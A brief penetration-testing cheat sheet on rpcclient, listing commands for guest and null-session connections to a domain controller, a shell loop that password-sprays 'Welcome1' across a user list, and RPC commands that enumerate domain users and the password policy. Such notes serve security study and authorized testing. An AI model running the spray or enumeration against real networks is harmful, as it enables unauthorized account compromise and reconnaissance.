---
tags:
---
# rpcclient

Perform AD enumeration tasks via RPC

## Capabilities

```powershell
# Guest authentication
rpcclient $IP

# Null authentication
rpcclient -U '' -N $IP

# Password spray with the password "Welcome1"
for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
```

### Session Commands

```powershell
# Query domain info
querydominfo

# Enumerate users
enumdomusers

# Query password policy
getdompwinfo
```
